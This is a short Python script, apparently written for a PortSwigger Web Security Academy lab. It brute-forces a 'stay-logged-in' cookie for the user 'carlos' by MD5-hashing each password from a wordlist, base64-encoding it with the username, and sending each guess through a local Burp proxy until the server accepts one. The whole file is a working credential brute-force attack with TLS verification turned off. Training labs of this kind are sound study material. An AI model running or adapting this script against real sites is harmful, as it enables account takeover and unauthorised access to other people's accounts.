#!/usr/bin/python3

import requests, hashlib, base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

wordlist_path = "/home/p4cm4n/Pentest_Learning/PortSwigger/Authentication/passwords"

url = "https://0a2400bd04bf53d781ae112000dd0002.web-security-academy.net/my-account"
req_number = 0

def get_cookie(password):
	pass_hash = hashlib.md5(password.encode()).hexdigest()
	nonenc_cookie = f"carlos:{pass_hash}"

	cookie_bytes = nonenc_cookie.encode('ascii')
	enc_cookie_bytes = base64.b64encode(cookie_bytes)
	enc_cookie = enc_cookie_bytes.decode('ascii')
	return {"stay-logged-in": f"{enc_cookie}"}

def send_req(password):
	global req_number
	print(req_number,end="\r")
	req_number += 1

	cookie = get_cookie(password)
	proxy = {"http":"http://127.0.0.1:8080" , "https":"http://127.0.0.1:8080"}
	r = requests.get(url,cookies=cookie, proxies=proxy, verify=False, allow_redirects=False)

	if(r.status_code == 200):
		print(f"Found password for carlos : {password}")
		exit(0)

with open(wordlist_path, "r") as f:
    wordlist = f.read().splitlines()

for word in wordlist:
	send_req(word)